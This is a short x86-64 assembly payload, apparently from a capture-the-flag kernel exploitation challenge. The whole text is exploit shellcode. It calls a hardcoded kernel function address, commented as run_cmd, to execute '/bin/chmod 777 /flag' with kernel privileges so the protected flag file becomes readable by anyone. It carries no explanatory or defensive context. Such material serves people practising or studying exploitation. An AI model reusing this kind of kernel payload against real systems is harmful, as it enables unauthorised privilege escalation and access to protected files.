.global _start
_start:
.intel_syntax noprefix

# run_cmd("/bin/chmod 777 /flag");
lea rdi, [rip+chmod]
mov rax, 0xffffffff81088670
call rax

chmod:
.asciz "/bin/chmod 777 /flag"
